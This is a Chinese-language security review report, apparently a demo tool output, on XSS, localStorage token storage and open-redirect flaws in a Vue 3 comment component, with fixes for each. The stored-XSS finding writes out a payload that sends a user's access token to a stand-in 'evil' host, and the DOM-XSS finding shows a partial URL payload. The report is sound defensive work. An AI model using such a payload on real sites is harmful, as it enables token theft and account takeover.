# 审查报告 · Vue 3 评论组件

> 样本：`CommentList.vue`（Vue 3 `<script setup>` + Axios）
> 本报告由 Code Security Review 生成，用于演示前端场景的输出形态。

## 一、审查概览

- **审查对象**：Vue 3 / `<script setup>` / Axios
- **数据流摘要**：服务端返回的 `comment.content`、URL 查询参数 `next` / `msg` → `v-html`、`innerHTML`、`href`；`localStorage` 中的 token → 请求头
- **总体风险等级**：**P1 高危**
- **统计**：严重 0 / 高危 2 / 中危 2 / 低危 0 / 提示 0 / 待确认 1

## 二、漏洞清单

| 编号 | 位置 | 漏洞类型 | 等级 | 结论 | 状态 |
| --- | --- | --- | --- | --- | --- |
| V-01 | CommentList.vue:5 | 存储型 XSS | P1 高危 | `v-html` 渲染服务端返回的评论正文 | 已确认 |
| V-02 | CommentList.vue:33 | DOM 型 XSS | P1 高危 | `innerHTML` 直接写入 URL 参数 | 已确认 |
| V-03 | CommentList.vue:17 | 凭据存储不当 | P2 中危 | access token 存 `localStorage`，可被任意脚本读取 | 已确认 |
| V-04 | CommentList.vue:29-30 | 开放重定向 | P2 中危 | `next` 参数未校验域名即用于跳转 | 已确认 |
| Q-01 | 服务端 | 输入过滤位置 | 待确认 | 服务端是否对评论正文做 HTML 转义 | 待确认 |

## 三、漏洞详情

### V-01 存储型 XSS [P1 高危] [已确认]

- **位置**：`CommentList.vue:5`
- **证据**：

```vue
<div v-html="c.content"></div>
```

- **分析**：`c.content` 来自 `/api/comments` 的返回值，属于其他用户提交的评论正文，是不可信输入。`v-html` 按原始 HTML 解析并插入 DOM，不转义标签与事件属性。污染在服务端存储、在客户端执行，属于存储型。
- **影响**：攻击者提交 `<img src=x onerror="fetch('//evil/'+localStorage.access_token)">` 即可在**每个访问该页面的用户**浏览器中执行脚本。结合 V-03 可直接窃取登录令牌，造成批量账号接管。
- **修复**：

方案 A（推荐，纯文本评论）：

```vue
<p class="content">{{ c.content }}</p>
```

方案 B（必须支持富文本时，先净化再渲染）：

```js
import DOMPurify from 'dompurify'

const safeHtml = computed(() =>
  DOMPurify.sanitize(c.content, { ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'br'] })
)
```

```vue
<div v-html="safeHtml"></div>
```

同时建议配置 CSP：`default-src 'self'; script-src 'self'`。

- **参考**：CWE-79

### V-02 DOM 型 XSS [P1 高危] [已确认]

- **位置**：`CommentList.vue:33`
- **证据**：

```js
document.getElementById('stat-slot').innerHTML = params.get('msg')
```

- **分析**：`msg` 直接取自 `location.search`，完全由访问者控制的 URL 决定，未经过任何转义就写入 `innerHTML`。这是典型的 DOM 型 XSS——payload 不经过服务端，服务端日志与 WAF 都看不到。
- **影响**：攻击者可构造 `?msg=<img src=x onerror=...>` 的链接，诱导受害者点击后在其会话中执行任意脚本。可用于钓鱼、令牌窃取、页面篡改。
- **修复**：

```js
// 纯文本场景
document.getElementById('stat-slot').textContent = params.get('msg') ?? ''

// 需要结构化展示时，用 createElement + textContent 组装节点
```

- **参考**：CWE-79

### V-03 凭据存储不当 [P2 中危] [已确认]

- **位置**：`CommentList.vue:17`
- **证据**：

```js
const token = localStorage.getItem('access_token')
```

- **分析**：`localStorage` 对同源下的**任意 JavaScript** 可读，没有任何隔离。一旦页面存在 XSS（本例 V-01、V-02 均已确认），令牌即可被一行脚本取走并外传。且 `localStorage` 无过期机制，令牌长期驻留。
- **影响**：把 XSS 从「页面篡改」升级为「账号接管」。这是它与 V-01 叠加后的真实危害等级。
- **修复**：

```js
// 服务端下发 HttpOnly + Secure + SameSite=Lax 的 Cookie，
// 前端不再持有令牌，由浏览器自动携带
// Set-Cookie: access_token=...; HttpOnly; Secure; SameSite=Lax; Path=/
```

若必须由前端持有，改用内存变量保存短期令牌 + `HttpOnly` 的 refresh cookie 续期，并缩短有效期。

- **参考**：CWE-922、CWE-522

## 四、待确认清单

| 编号 | 问题 | 原因类型 | 需要补充的信息 | 暂定等级与假设 |
| --- | --- | --- | --- | --- |
| Q-01 | 服务端 `/api/comments` 是否已对 `content` 做 HTML 转义 | 上下文不足 | 服务端序列化逻辑、是否使用富文本编辑器 | 若服务端已转义为实体，V-01 降为 P3；若存原文（富文本场景常见），维持 P1 |
| Q-02 | 评论内容是否允许富文本 | 业务判定 | 产品需求文档 | 若明确允许富文本，方案 A 不适用，必须走 DOMPurify |

## 五、修复优先级

1. **V-01 + V-02** 一起修——两处 XSS 是后续所有问题的放大器
2. **V-03** 令牌改 Cookie——单独修 V-03 意义有限，必须与 XSS 同步处理
3. **V-04** 加域名白名单或改站内路由跳转
4. 补充 CSP 响应头，作为纵深防御

## 六、审查边界

静态审查，未运行代码。仅针对该单文件组件，未审查构建配置、HTTP 拦截器、服务端接口实现。`Q-01` 的结论会直接改变 V-01 的等级，建议补充服务端代码后重新评估。
